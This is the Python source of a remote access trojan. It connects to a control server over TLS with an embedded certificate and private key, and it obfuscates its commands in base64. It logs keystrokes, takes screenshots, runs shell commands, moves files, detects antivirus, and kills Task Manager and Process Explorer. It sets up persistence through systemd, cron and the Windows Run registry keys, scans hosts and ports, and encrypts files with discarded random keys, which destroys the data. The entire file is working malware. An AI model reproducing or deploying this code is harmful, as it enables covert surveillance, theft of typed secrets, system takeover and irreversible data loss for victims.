import ctypes
import os
import shutil
import socket
import ssl
import subprocess
import sys
import time
import threading
import pynput.keyboard
import platform
import pathlib
import psutil
import base64
import tempfile
from base64 import b64decode
import ipaddress
import asyncio
import secrets
import concurrent
from concurrent import futures
from datetime import datetime
from PIL import ImageGrab
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import requests

# Variables globales
my_list_of_tasks = []
my_tasks = []
nbr_host_found = 0
list_of_hosts_found = []

try:
    apdt = os.environ['appdata']
    cook_th = os.path.join(apdt, "handlermanager.txt")
    kygerth = path = os.path.join(apdt, "processmanager.txt")

except KeyError:
    tmp = "/tmp/"
    kygerth = tmp + "processmanager.txt"
    cook_th = tmp + "handlermanager.txt"


async def ping_coroutine(cmd, ip):

    global nbr_host_found, list_of_hosts_found

    running_coroutine = await asyncio.create_subprocess_shell(
        cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE)

    stdout = await running_coroutine.communicate()

    if "ttl=" in str(stdout).lower():
        nbr_host_found += 1
        list_of_hosts_found.append(ip)

async def ping_loop():

    global my_tasks, my_list_of_tasks
    for each_task_list in my_list_of_tasks:
        for each_coroutine in asyncio.as_completed(each_task_list):
            await each_coroutine



class Networkscan:


    def __init__(self, ip_and_prefix):

        self.nbr_host_found = 0
        self.list_of_hosts_found = []
        self.filename = "hosts.yaml"

        try:
            self.network = ipaddress.ip_network(ip_and_prefix)
        except:
            sys.exit("Incorrect network/prefix " + ip_and_prefix)

        self.nbr_host = self.network.num_addresses
        if self.network.num_addresses > 2:
            self.nbr_host -= 2
        self.one_ping_param = "ping -n 1 -l 1 -w 1000 " if platform.system().lower() == "windows" else "ping -c 1 -s 1 -w 1 "

    def run(self):

        global my_tasks, nbr_host_found, list_of_hosts_found, my_list_of_tasks

        self.nbr_host_found = 0
        self.list_of_hosts_found = []
        my_tasks = []
        nbr_host_found = 0
        list_of_hosts_found = []

        i = 128

        my_list_of_tasks = []
        my_list_of_tasks.append(my_tasks)

        if self.network.num_addresses != 1:
            for host in self.network.hosts():
                cmd = self.one_ping_param + str(host)
                my_tasks.append(ping_coroutine(cmd, str(host)))
                i -= 1

                if i <= 0:
                    i = 128
                    my_tasks = []
                    my_list_of_tasks.append(my_tasks)
        else:
            host = str(self.network.network_address)
            cmd = self.one_ping_param + host
            my_tasks.append(ping_coroutine(cmd, host))

        if platform.system().lower() == "windows":
            asyncio.set_event_loop_policy(
                asyncio.WindowsProactorEventLoopPolicy())
        asyncio.run(ping_loop())
        self.list_of_hosts_found = list_of_hosts_found
        self.nbr_host_found = nbr_host_found


def crte():
    return b'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMyakNDQWNLZ0F3SUJBZ0lVY2wvZmZVbVc1NlE4cDlFU2VrdnlkVWhFOWJRd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0dERVdNQlFHQTFVRUF3d05LaTVsZUdGdGNHeGxMbU52YlRBZUZ3MHlNekE1TURZeU1EQXhOVFJhRncweQpOREE1TURVeU1EQXhOVFJhTUJneEZqQVVCZ05WQkFNTURTb3VaWGhoYlhCc1pTNWpiMjB3Z2dFaU1BMEdDU3FHClNJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUNvOStBTWw0aVpvTzdEZzd5QTB4cUcyaHRGTnZwUExxT3gKbkk1bkNCWVR6azFqV1ZvcjcycXZNOW9iR0lIeG1CWUJ1YXRIS0V0NXJWTzRLNXB2b1NrekdhT3NmUUtYbzcyYgp5TmRYemFKUVN3WFZSSldkcEs1cnpjZlhqdUp3U3BtcHlpN2J5YXlyNlpmNFhPNk1rSFJoNWEzWkNXN1JJSk9MCmJSRndyLzRtWDM2VnU5SVBPdUk0cWFxWmlSa004WmpnUnZ6QWhXaDNubm1hcEtnb3JQSnUwSDNhblBZTkxYU2oKMU5sWUg4MGFQMTQwZkFOaG9zbjRFbHdtRjY1V2xhNU1USlJlbXpxbG5OczA0OTBGOUVxL1hRbkVTS0hRditBKwpOY21abE1rL1pHd2xVWnovbUgxdGt3VkgrZXJnYXBMMk0vR2FPK09MWjdqU2NLU2E3SmVuQWdNQkFBR2pIREFhCk1CZ0dBMVVkRVFRUk1BK0NEU291WlhoaGJYQnNaUzVqYjIwd0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFFUHgKeEx3dFdndWcxYkNsaG5hRUFoRU1iL2hBNDBsbE5nSU5sOVptWk5LMUFBZUU0bjVaZ2tzSWZaV1dlUmVYT0p2VQp1TkhON3JFRnAwWktKNmNsSjVPOUk5eG5aU3gzbms4UVN5eFl2RE56Y0QyYTlEMklCcmYwZFROUnJUam8vdlozClBHVythL0lnaWI0dCs1SkljOTV3NEN1S210NFpoT3ZxZmo0bkZXYWpkbjdIZ0lvRnNjeGRVZW82aU00aHArcWcKOU94M0JJRVVTWFg4bDFCdFVodXYyaVZUTTJTdDRXMmk4N1BUVTlDcEMzQ3hYaHpmUHdhNkVNK25uSE9oRkNwQQpvcTI0cVEwS2svckczZVluRCtRTnhHRXdPekF0Q3YzUTZZNlVvMXV1TVNqUDgwaXJtVjREeFlPRFVpUkRaRjZiClNYZWRRcVREVTgyTi96WGpXdVE9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K'


def locker():
    return b'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBcVBmZ0RKZUltYUR1dzRPOGdOTWFodG9iUlRiNlR5NmpzWnlPWndnV0U4NU5ZMWxhCksrOXFyelBhR3hpQjhaZ1dBYm1yUnloTGVhMVR1Q3VhYjZFcE14bWpySDBDbDZPOW04alhWODJpVUVzRjFVU1YKbmFTdWE4M0gxNDdpY0VxWnFjb3UyOG1zcSttWCtGenVqSkIwWWVXdDJRbHUwU0NUaTIwUmNLLytKbDkrbGJ2UwpEenJpT0ttcW1Za1pEUEdZNEViOHdJVm9kNTU1bXFTb0tLenlidEI5MnB6MkRTMTBvOVRaV0IvTkdqOWVOSHdECllhTEorQkpjSmhldVZwV3VURXlVWHBzNnBaemJOT1BkQmZSS3YxMEp4RWloMEwvZ1BqWEptWlRKUDJSc0pWR2MKLzVoOWJaTUZSL25xNEdxUzlqUHhtanZqaTJlNDBuQ2ttdXlYcHdJREFRQUJBb0lCQURNbTF5ejRzdUhQVm5qWgo2TGNYTVhDaGxwL2RoT2x6dFJxUHlveG1aa2lZcTlUbnQrU1ZGamJ6KzVNNFdCNUxiRjRaVjBDemNpWGowdlJ1ClB0S01kMnlBMW92aFRHZWJxa3IvQWpJU2pwREFKWVBxdjJCNStsT29lRmRKYWtPVVVmQ1V4SnJFOHdFWU5tbDUKdUwzVS9XYWxvWHVTMzNsdjR6clNTZlZUVWgxTFROalBXVDVHdnhST3dUMTYzdUpqL05sSGxrdEhwNEhzdDdVLwpoR3l6T0RQWFdBdnZBcG5jeHRTZ2dZdVUwdStTN3M3QndCRmVwbGhTSHJ4K2lleWsvR044amptQVJTL3dLa2U4ClcwYWhFN3hMcU01L3JDbFNFeTU0aExjbzhMbjVVcXVjUmRzUlNxVjBvZXNWbFF4dU03aWJneU9nVmtZd1pxWmUKK2pOK1JBRUNnWUVBNkFpODdKd2F1dTNsY3lnU2toelFRTHNqMlRUYXpNWGxPbVJnc3ROZkRrS0hUUFZ5S290UApSR0x4eUg2YzVmRGhwVUpTdGhTbkpRN1djMWZnazdMSTY0SklnNmc1ajNWRjBFRDZMSHNROGd2YktJZFNERnc2CjJDNDBqNThwZ0YwQ1Y1UWlqd2pWdm1wRU1oTDAzL2d5cm1RV3VJQTJQQURwREtFMFZJaWF4b01DZ1lFQXVtdVoKZ0lhSVBUMWdCQlhaUWdTOUJNWWN2bzNCNXJnUnNMd295ZEliM2VOcUVlS1pRL1htMmJ0c3NIeTdmV2JRSGhYZQp5Y0F6RklMdVppTzRyRUFaQ0F3cjQydmZOVTFoY0tHbzB6QVlyd2dwQ2pEaExvYTF6Smp3RE1UNmRkcG9oZzFHClhWcGlkMG1Dd1hTM2FrTUQzWGFxZmFlYVlObXZwSGRiUmV4dUFRMENnWUVBeEdxcEtvM1dYc2lGQTk4M0lUSjgKNDE3SE1OWDZKWCtiMUxzbDFCcnppMG1yNk95WThRU3VYQkI1NWFPd1EwR09jV3RjUXIvbTRZclc1QnJPZzVqRApWZ0VhUzBDN1FRSWZ6L05CRXlnMkp2NzhUU21IdmVqUTh6RGgwM1lERnFNbEdXZlBmVThZU0xFQiszVnFqckUyCmpjTXlMSXB6M29WU3doc3dCaU1CQ2VzQ2dZQVJ5NU9yb1N3QUxJdXQyQ2dWRlQ2MTVmTjRmUysxUm56cDBneFMKdDZ2UlVwUWRnUFFBZU1qQW9CT1FCVmdnY0dBTmZ5ajFPVk9tOFppd1IxaXBtTFRLLzk1d3B5dDNleHVDRk94NAp2RzZleHJpa01HWk9lcTJBQ2xsZjNxM0o4ajlvREh4YkRQVzVUVnNkL0haRnZuL3Y5QlB5U3IyQjRVWFMvVkhKCkt2aVZRUUtCZ0Z5NUppNjJja1JzRklqNlkxaEhGOElJYVQvYzJ4Um9tL3hzcEtGR3VpUlhOM0Z0eHpEaUhnRGQKMWFsUXZZK1E2TEZIbEVGNlNaK21vaGI1b24xQUZxL2VrRDJtKzduNW5vRkNodENyRUJqK0Y5MnNRcjdqMmVTbQpEWS93dE1BeGhBVlFTd0piM3BlMHM2aFRSSGJZU05qSmlHY2t5WHQ3bkQ2VE9zcncvU1p5Ci0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg=='


def get_crte():
    return b64decode(crte()).decode()


def get_locker():
    return b64decode(locker()).decode()


crt = tempfile.NamedTemporaryFile(delete=False)
crt.write(get_crte().encode())
crt.close()

ky = tempfile.NamedTemporaryFile(delete=False)
ky.write(get_locker().encode())
ky.close()

context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
context.load_cert_chain(certfile=crt.name, keyfile=ky.name)


g = ""
try:
    ph = os.environ["appdata"] + "\\processmanager.txt"
except KeyError:
    ph = "/tmp/processmanager.txt"


def pSSks(k):
    global g
    try:
        g += str(k.char)
    except AttributeError:
        if k == k.space:
            g += " "
        elif k == k.tab:
            g += " [TAB] "
        elif k == k.backspace:
            g += " [DELETE] "
        elif k == k.right:
            g += ""
        elif k == k.left:
            g += ""
        elif k == k.up:
            g += ""
        elif k == k.down:
            g = ""
        else:
            g += "" + str(k) + ""


def wte(chipred):
    with open(ph, "ab") as fin:
        fin.write(chipred.encode())


def report():
    global g
    global ph

    # Escribimos
    wte(g)

    g = ""
    timer = threading.Timer(10, report)
    timer.start()


def start():
    ky_stnr = pynput.keyboard.Listener(on_press=pSSks)
    with ky_stnr:
        report()
        ky_stnr.join()


def pad(message):
    padder = padding.PKCS7(128).padder()
    padded_message = padder.update(message)
    padded_message += padder.finalize()
    return padded_message


def encrypt(content, key):
    message = pad(content)
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(message) + encryptor.finalize()
    return iv + ciphertext


def init_crypt_file(file, key):
    with open(file, "rb") as f:
        content = f.read()

    if not key:
        key = secrets.token_bytes(32)

    encrypted_file_data = encrypt(content, key)
    with open(file, "wb") as f:
        f.write(encrypted_file_data)

    return encrypted_file_data


def list_files_in_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            yield os.path.join(root, file)


def crypt_file(file):
    init_crypt_file(file, None)


def crptall(file_generator):
    threads = []
    for file in file_generator:
        thread = threading.Thread(target=crypt_file, args=(file,))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish before exiting
    for thread in threads:
        thread.join()


def strCpt(instruct):
    print(instruct)
    dirlist = instruct.replace("Y3J5cHREaXIK " ,"")
    print(dirlist)
    file_generator = list_files_in_directory(dirlist)
    crptall(file_generator)


def perm():
    global dmin
    if os.name == "posix":
        if os.getuid() == 0:
            dmin = "\n\t[+] Admin Privileges\n"
        else:
            dmin = "\n\t[-] User Privileges\n"
    else:
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            dmin = "\n\t[-] User Privileges\n"
        else:
            dmin = "\n\t[+] Admin Privileges\n"
    return dmin


def ispn():
    if os.name == "posix":
        gbl_nme = {
            "gnome-system-monitor",
            "xfce4-taskmanager",
            "mate-system-monitor",
        }
    else:
        gbl_nme = {
            "Taskmgr.exe",
            "procexp64.exe"
        }
    for xx in psutil.process_iter(attrs=['pid', 'name']):
        if xx.info['name'] in gbl_nme:
            return xx.info['pid']

    return False


def stger():
    while True:
        pid = ispn()
        if pid:
            try:
                os.kill(pid, 9)
            except PermissionError:
                pass
        time.sleep(0.2)


def init_task():
    t = threading.Thread(target=stger)
    t.start()
    sock.send("successfully".encode())


def make_conect ():
    global connect ,sock
    while True:
        sock = socket . socket (socket . AF_INET ,socket . SOCK_STREAM)
        #try:
        sock.connect ( ( '127.0.0.1' ,2457) )
        sock = context . wrap_socket (sock)
        game (sock)
        time . sleep (5)
        """except Exception as e:
            print(e)
            time.sleep (10)
            make_conect ()
        """

def srtTks():
    try:
        taskThread = threading.Thread(target=init_task)
        taskThread.start()
    except Exception as e:
        sock.send(f"ERROR: {e}".encode())


def gtNfo():
    system_info = platform.uname()

    sysinfo = f"""

                [!>] Target:  {str(system_info.system)}\n
            | Node Name: {str(system_info.node)}
            ----------------------------------|
            | Kernel: {str(system_info.release)}
            ----------------------------------|
            | Version: {str(system_info.version)}
            ----------------------------------|
            | Machine: {str(system_info.machine)}
            ----------------------------------|
            | Processor: {str(system_info.processor)}
            ----------------------------------|
                """

    return sysinfo


def chdir(work):
    print("\n**", work)
    try:
        if work == "cd":
            dir = pathlib.Path.home()
            os.chdir(dir)
            sock.send(f"cd {dir}".encode())
        else:
            os.chdir(work[3:])
            sock.send(f"cd {work}".encode())
    except Exception as e:
        sock.send(f"{e}".encode())


def realGme():
    while True:
        work = sock.recv(4096).decode()  # Ajusta el tamaño del búfer según sea necesario

        if not work:
            continue

        if "q" in work:
            break

        else:
            excIns(work.replace("ZXhlYwo= ", ""))


def dload(instruct):
    file = instruct.replace("ZG93bmxvYWQK ", "").strip()

    with open(file, "rb") as fl:
        while True:
            dt = fl.read (4096)
            dt = base64 .b64encode (dt)
            if not dt:
                sock .send('end' .encode () )
                break
            sock.send(dt)
        fl.close()


def dloadD (instruct):
    path = instruct.replace ( "ZG93bmxvYWREaXIK " ,"")

    def send_file (sock ,file_path):
        with open(file_path ,'rb') as f:
            sock . sendall(f .read ())

    sz = 0
    for root ,dirs ,files in os .walk (path):
        for file in files:
            file_path = os .path .join (root ,file)
            sz += os .path .getsize (file_path)

    sock.send (str (sz). encode ( ))  # Envía el tamaño total al servidor
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os .path .join (root ,file)
            relth = os .path .relpath (file_path ,path)
            sock. send (relth . encode ( ) )

            send_file(sock ,file_path)
            sock.send("end" .encode ())
    sock.send("done".encode())


def excIns(work):
    if "cd" in work:
        chdir(work)
    else:
        try:
            xxx = subprocess.Popen(work, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, )
            stot, stder = xxx.communicate()

            buffer = len(stot)
            if buffer > 4096:
                sock.send(f"buffer {buffer}".encode())
                sock.send(stot)
            else:
                if stder:
                    sock.send(stder)
                    return False
                if not stot:
                    return False
                sock.send(stot)
        except Exception as e:
            sock.send(e)


def A_V_Dte_Ct():
    global a_v_us_e
    a_v_lst = [
        "Windows Defender",
        "SecHealthUI",
        "SecurityHealthSystray",
        "Norton",
        "McAfee",
        "Avast",
        "AVG",
        "Kaspersky",
        "Bitdefender",
        "ESET NOD32",
        "Trend Micro",
        "Avira",
        "Sophos",
        "Malwarebytes",
        "mbamtray",
        "Panda",
        "webroot secureanywhere",
        "f-secure"
    ]
    a_v_us_e = []

    for xx in psutil.process_iter(['pid', 'name']):
        try:
            xx_nme = xx.info['name'].lower()
            for av in a_v_lst:
                if av.lower() in xx_nme and av.lower() not in a_v_us_e:
                    a_v_us_e.append(xx_nme)

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    if a_v_us_e:
        for av in a_v_us_e:
            if "mbamtray" in av:
                av = "Malwarebytes"
            elif "SecHealthUI".lower() in av:
                av = "Windows Defender"
            elif "SecurityHealthSystray".lower() in av:
                av = "Windows Defender"
            sock.send(av .encode ())
        sock.send("end" . encode ())
    else:
        sock.send("n".encode())
        return


def uload(instruct):
    buffer = 4096
    file = instruct.replace("dXBsb2FkCg== ", "")
    fileData = b""
    with open(file, "wb") as file:
        while True:
            data = sock.recv(buffer)
            if "end".encode() in data:
                break

            if len(data) % 4 != 0:
                data += b'=' * (4 - len(data) % 4)
            data = base64.b64decode(data)
            fileData += data

        file.write(fileData)


def gt(instrunct):
    try:
        lru = instrunct.replace("Z2V0Cg== ", "")
        fnliame = lru.split("/")[-1]
        esnopser = requests.get(lru)
        with open(fnliame, 'wb') as f:
            f.write(esnopser.content)
        sock.send("end".encode())
    except Exception as e:
        sock.send(e)


def bWFrZVBlcnNpc3RlbmNlCg():
    if os.name == "posix":
        if not os. path .exists ("/etc/lightdm/addOn/"):
            os.makedirs("/etc/lightdm/addOn/")
        svice = """
CltVbml0XQpEZXNjcmlwdGlvbj1YLVNlc3Npb24tYWRkT24KQWZ0ZXI9bmV0d29yay50YXJnZXQK
CltTZXJ2aWNlXQpFeGVjU3RhcnQ9L2V0Yy9saWdodGRtL2FkZE9uL2FkZE9uQmluYXJ5ClJlc3Rh
cnQ9YWx3YXlzCgpbSW5zdGFsbF0KV2FudGVkQnk9Z3JhcGhpY2FsLnRhcmdldCAKICAgICAgICAK
"""
        with open("/etc/systemd/system/addOn-xsession.service", "w") as s:
            s.write(base64.b64decode(svice).decode())

        shutil.copyfile(sys.executable ,"/etc/lightdm/addOn/addOnBinary")
        os.chmod("/etc/lightdm/addOn/addOnBinary",  0o755)
        os.system(base64.b64decode("c3lzdGVtY3RsIGVuYWJsZSBhZGRPbi14c2Vzc2lvbi5zZXJ2aWNlICY+L2Rldi9udWxsCg=="))
    else:
        location = os.environ["appdata"] + "\\Mservice.exe"

        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call(
                f'reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MService /t REG_SZ /d "{location}"',
                shell=True)


def bWFrZUxvd3BlcnNpc3RlbmNlCg():
    if os.name == "posix":
        path = str(pathlib.Path.home()) + "/.config"
        if not os .path .exists (f"{path}/worker"):
            os .makedirs (f'{path}/worker')
        shutil .copyfile (sys.executable ,f'{path}/worker/worker')
        os .chmod (f'{path}/worker/worker', 0o755)
        kwor = f"@reboot {path}/worker/worker\n"

        with open("/tmp/tmpajfeasc", "w") as c:
            c.write(kwor)

        os .system (base64 .b64decode ("Y3JvbnRhYiAvdG1wL3RtcGFqZmVhc2MgJj4vZGV2L251bGwK"))

    else:
        location = os.environ["appdata"] + "\\Mservice.exe"

        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call(
                f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MService /t REG_SZ /d "{location}"',
                shell=True)
    sock.send("done".encode())


def cGVyc2lzdGVuY2UK():
    if perm() == "\n\t[+] Admin Privileges\n":
        bWFrZVBlcnNpc3RlbmNlCg()
        sock.send("root")
    else:
        sock.send("no_root".encode())


def sdnKog():
    with open(kygerth, "r") as data:
        data = data.read()
    bytes_sent = 0
    total_bytes = len(data)
    chunk_size = 1024
    while bytes_sent < total_bytes:
        end_idx = min(bytes_sent + chunk_size, total_bytes)
        chunk = data[bytes_sent:end_idx]
        sock.send(data.encode())
        bytes_sent += len(chunk)

    sock.send("[+] Keylog sent successfully.".encode())


def sdsht():
    try:
        st = ImageGrab.grab()
        st.save("x.png", "PNG")
        with open("x.png", "rb") as f_st:
            dt_st = f_st.read()
        os.remove("x.png")
        return dt_st
    except Exception as e:
        return str(e).encode()


def tk_nd_sd_sht():
    screenshot_data = sdsht()
    bytes_sent = 0
    total_bytes = len(screenshot_data)
    chunk_size = 1024
    while bytes_sent < total_bytes:
        end_idx = min(bytes_sent + chunk_size, total_bytes)
        chunk = screenshot_data[bytes_sent:end_idx]
        sock.send(chunk)
        bytes_sent += len(chunk)

    sock.send(base64.b64decode(b"WytdIFNjcmVlbnNob3Qgc2VudCBzdWNjZXNzZnVsbHkuCg=="))


def cntread(xx):
    try:
        with open(xx, "rb") as  yy:
            yy = yy.read()
        chipred = encrypt(yy, secrets.token_bytes(32))
        with open(xx, "wb") as yy:
            yy.write(chipred)
        return "True"
    except Exception as e:
        return str(e)


def scnet():
    formed = detectIp_Mask()
    sock.send(str(formed).encode())
    ip = sock.recv(1024).decode()
    scn = Networkscan(ip)
    scn.run()
    hs = scn.list_of_hosts_found
    sock.send(str(scn.nbr_host_found).encode())
    for h in hs:
        sock.send(h.encode())
    #sock.send("end".encode())


def init_scan(target):
    ports = 65535
    open_ports = []
    def scaning(port):
        if port % 75 == 0:
            #▒
            r = "\r" + '\tScaning Port : %s/%s [%s%s] %.2f%%' % (port, ports, "▓" * int(port * 25 / ports),
                                                                    "▒" * (25 - int(port * 25 / ports)),
                                                                    float(port / ports * 100))
            sock.send(str(r).encode())

        # Creamos el Socket para la conexión
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Definimos tiempo máximo de espera a la conexion
        socket.setdefaulttimeout(0.15)

        try:
            # creamos la conexion
            result = s.connect_ex((target, port))
            # Si resulta victorioisa la conexion informamos de puerto abierto
            if result == 0:
                open_ports.append(port)
        except Exception as e:
            sock.send("Error inesperado : {}".format(err).encode())
        finally:
            s.close()

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = []
        for port in range(1, ports + 1):
            try:
                futures.append(executor.submit(scaning, port))
            except Exception as err:
                sock.send("Error inesperado : {}".format(err).encode())

    sock.send(str(open_ports).encode())
    time.sleep(0.1)


def printFormed(netstat):
    ipFormed = []
    # Comprueba si las listas 'ip' y 'mask' tienen el mismo número de elementos
    if len(netstat['ip']) == len(netstat['mask']):
        for id in range(len(netstat['ip'])):
            ip = netstat['ip'][id]
            mask = netstat['mask'][id]
            subnet = str(ipaddress.ip_network(f"{ip}/{mask}", strict=False))
            ipFormed.append(subnet)
    return ipFormed


def detectIp_Mask():
    if os.name != "posix":
        command = 'powershell.exe -c "ipconfig | Select-String -Pattern \'Dirección|Máscara\' -CaseSensitive | ForEach-Object { ($_.Line.Split(\' \'))[19] } "'
    else:
        # Mejor: ip a | grep -oP 'inet .*' | awk '{print $2}'
        command = "ifconfig | grep -oP 'inet .*' | awk '{print $2, $4}' | tr ' ' '\n'"

    result = subprocess.run(command, capture_output=True, text=True, shell=True)

    output = result.stdout
    output = output.split("\n")  # Aquí se guarda la salida del comando

    netstat = {"ip": [],
               "mask": []}
    id = 0
    for content in output:
        if content:  # Comprueba si la línea no está vacía
            if id == 0:
                netstat['ip'].append(content)
                id += 1
            elif id == 1:
                netstat['mask'].append(content)
                id = 0

    formed = printFormed(netstat)
    return formed


def game (sock):

    while True:
        instruct = sock. recv (1024)

        if instruct == " ".encode():
            sock.send(" ".encode())


        elif instruct == "Y2xvc2UK" . encode ( ):
            sock . close ()
            break

        elif "c3RhcnRUYXNrCg==" . encode ( ) in instruct:
            t1 = threading . Thread(target=srtTks)
            t1. start ( )

        elif 'Y2hlY2sK'.encode() in instruct:
            sock. send(perm ( ) .encode( ))

        elif 'c3lzaW5mbwo=' .encode () in instruct:
            sock. send(gtNfo () .encode () )

        elif 'ZG93bmxvYWREaXIK'.encode() in instruct:
            dloadD (instruct. decode ())

        elif 'ZG93bmxvYWQK'.encode() in instruct:
            dload( instruct . decode ( ) )

        elif 'dXBsb2FkCg=='.encode() in instruct:
            uload ( instruct . decode ( ) )

        elif "YXYK".encode() in instruct:
            a = threading . Thread (target=A_V_Dte_Ct)
            a. start ( )
            a. join ( )
            time.sleep(0.1)

        elif 'c2hlbGwK' . encode( ) in instruct:
            realGme()

        elif 'ZXhlYwo=' . encode() in instruct:
            c = instruct.decode()
            excIns (c . replace ('ZXhlYwo= ', ""))

        elif "Z2V0Cg==" . encode ( ) in instruct:
            gt( instruct. decode ( ))

        elif "cGVyc2lzdGVuY2UK" .encode ( ) == instruct[:16]:
            cGVyc2lzdGVuY2UK()

        elif "bG93cGVyc2lzdGVuY2UK" .encode () in instruct:
            bWFrZUxvd3BlcnNpc3RlbmNlCg()

        elif "Y3J5cHQK" .encode () in instruct:
            x = cntread (instruct .replace ("Y3J5cHQK " .encode (), "" .encode ()) .decode())
            sock.send ( x .encode ())

        elif "Y3J5cHREaXIK" .encode () in instruct:
            strCpt(instruct.decode())
            sock.send("done".encode())

        elif "a2V5bG9nX2R1bXAK" .encode () in instruct:
            t1 = threading.Thread(target=sdnKog)
            t1.start()

        elif "c2NyZWVuc2hvdAo=" .encode () in instruct:
            tk_nd_sd_sht()

        elif "c2Nhbm5ldAo=" .encode () in instruct:
            scnet()

        elif "c2Nhbmhvc3QK" .encode() in instruct:
            init_scan(instruct.decode() .replace("c2Nhbmhvc3QK ", ""))

        else:
            pass


def main ():
    t1 = threading.Thread(target=start)
    t1.start()

    """startThread = threading . Thread (target=make_conect)
    startThread .start ()"""
    make_conect()



if __name__ == "__main__":
    main()
